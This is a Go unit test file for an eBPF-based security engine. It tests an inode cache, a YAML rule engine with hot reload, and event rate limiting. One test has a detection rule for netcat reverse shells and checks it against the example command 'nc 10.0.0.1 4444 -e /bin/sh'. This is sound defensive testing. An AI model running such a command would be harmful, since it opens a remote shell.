package engine

import (
	"context"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/rs/zerolog"

	zaskebpf "github.com/CrlsMrls/zask/internal/ebpf"
)

func TestInodeCache_HitAndMiss(t *testing.T) {
	cache := NewInodeCache(100, 5*time.Minute)

	key := zaskebpf.ZaskInodeKey{InodeNumber: 123, DeviceId: 1}

	if cache.Contains(key) {
		t.Error("Contains() = true for empty cache, want false")
	}

	cache.Add(key)
	if !cache.Contains(key) {
		t.Error("Contains() = false after Add(), want true")
	}
}

func TestInodeCache_Expiration(t *testing.T) {
	cache := NewInodeCache(100, 10*time.Millisecond)

	key := zaskebpf.ZaskInodeKey{InodeNumber: 456, DeviceId: 2}
	cache.Add(key)

	if !cache.Contains(key) {
		t.Fatal("Contains() = false immediately after Add()")
	}

	time.Sleep(20 * time.Millisecond)

	if cache.Contains(key) {
		t.Error("Contains() = true after TTL expired, want false")
	}
}

func TestInodeCache_InodeKeyedNotPID(t *testing.T) {
	cache := NewInodeCache(100, 5*time.Minute)

	key1 := zaskebpf.ZaskInodeKey{InodeNumber: 100, DeviceId: 1}
	key2 := zaskebpf.ZaskInodeKey{InodeNumber: 200, DeviceId: 1}

	cache.Add(key1)

	if !cache.Contains(key1) {
		t.Error("Contains(key1) = false, want true")
	}
	if cache.Contains(key2) {
		t.Error("Contains(key2) = true, want false (different inode)")
	}
}

func TestInodeCache_EvictionAtCapacity(t *testing.T) {
	cache := NewInodeCache(2, 5*time.Minute)

	k1 := zaskebpf.ZaskInodeKey{InodeNumber: 1, DeviceId: 1}
	k2 := zaskebpf.ZaskInodeKey{InodeNumber: 2, DeviceId: 1}
	k3 := zaskebpf.ZaskInodeKey{InodeNumber: 3, DeviceId: 1}

	cache.Add(k1)
	cache.Add(k2)
	cache.Add(k3)

	if cache.Size() > 2 {
		t.Errorf("Size() = %d, want <= 2", cache.Size())
	}
}

func TestRuleEngine_MatchKnownMalicious(t *testing.T) {
	log := zerolog.Nop()
	re := NewRuleEngine(log)

	rules := `
rules:
  - name: reverse-shell-netcat
    description: "Detects netcat reverse shells"
    pattern: 'nc\s+.*-e\s+/bin/(sh|bash)'
    action: BLOCK
    severity: critical
`
	if err := re.LoadFromBytes([]byte(rules)); err != nil {
		t.Fatalf("LoadFromBytes() error = %v", err)
	}

	matched, rule := re.Match("nc 10.0.0.1 4444 -e /bin/sh")
	if !matched {
		t.Error("Match() = false for malicious command, want true")
	}
	if rule.Name != "reverse-shell-netcat" {
		t.Errorf("rule.Name = %q, want %q", rule.Name, "reverse-shell-netcat")
	}
	if rule.Action != "BLOCK" {
		t.Errorf("rule.Action = %q, want %q", rule.Action, "BLOCK")
	}
}

func TestRuleEngine_NoMatchNormalCommand(t *testing.T) {
	log := zerolog.Nop()
	re := NewRuleEngine(log)

	rules := `
rules:
  - name: reverse-shell-netcat
    pattern: 'nc\s+.*-e\s+/bin/(sh|bash)'
    action: BLOCK
    severity: critical
`
	if err := re.LoadFromBytes([]byte(rules)); err != nil {
		t.Fatalf("LoadFromBytes() error = %v", err)
	}

	matched, _ := re.Match("/usr/bin/ls -la /tmp")
	if matched {
		t.Error("Match() = true for normal command, want false")
	}
}

func TestRuleEngine_HotReload(t *testing.T) {
	log := zerolog.Nop()
	re := NewRuleEngine(log)
	defer re.Close()

	dir := t.TempDir()
	rulesPath := filepath.Join(dir, "rules.yaml")

	initial := `
rules:
  - name: test-rule-1
    pattern: 'test_pattern_1'
    action: BLOCK
    severity: high
`
	if err := os.WriteFile(rulesPath, []byte(initial), 0o644); err != nil {
		t.Fatalf("write rules file: %v", err)
	}

	if err := re.LoadFromFile(rulesPath); err != nil {
		t.Fatalf("LoadFromFile() error = %v", err)
	}

	if err := re.WatchFile(rulesPath); err != nil {
		t.Fatalf("WatchFile() error = %v", err)
	}

	updated := `
rules:
  - name: test-rule-1
    pattern: 'test_pattern_1'
    action: BLOCK
    severity: high
  - name: test-rule-2
    pattern: 'new_hot_reload_pattern'
    action: ALERT
    severity: medium
`
	if err := os.WriteFile(rulesPath, []byte(updated), 0o644); err != nil {
		t.Fatalf("write updated rules file: %v", err)
	}

	time.Sleep(500 * time.Millisecond)

	matched, rule := re.Match("new_hot_reload_pattern here")
	if !matched {
		t.Error("Match() = false for hot-reloaded rule, want true")
	}
	if rule.Name != "test-rule-2" {
		t.Errorf("rule.Name = %q, want %q", rule.Name, "test-rule-2")
	}
}

func TestRuleEngine_InvalidRegex(t *testing.T) {
	log := zerolog.Nop()
	re := NewRuleEngine(log)

	rules := `
rules:
  - name: bad-regex
    pattern: '(?invalid'
    action: BLOCK
    severity: high
`
	if err := re.LoadFromBytes([]byte(rules)); err == nil {
		t.Error("LoadFromBytes() expected error for invalid regex, got nil")
	}
}

func TestEngine_RateLimiterDropsExcess(t *testing.T) {
	log := zerolog.Nop()
	aiQueue := make(chan zaskebpf.ZaskEvent, 100)

	eng, err := New(EngineOptions{
		RateLimit: 2,
		RateBurst: 2,
		AIQueue:   aiQueue,
	}, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer eng.Close()

	ctx := context.Background()

	var aiCount int
	for i := 0; i < 20; i++ {
		ev := zaskebpf.ZaskEvent{
			InodeNumber: uint64(1000 + i),
			DeviceId:    1,
			Pid:         uint32(i + 100),
		}
		verdict := eng.Process(ctx, ev)
		if verdict.Action == ActionAIQueue {
			aiCount++
		}
	}

	if aiCount > 5 {
		t.Errorf("AI queue received %d events, expected at most ~burst (2-5)", aiCount)
	}
	if aiCount == 0 {
		t.Error("AI queue received 0 events, expected at least some")
	}
}
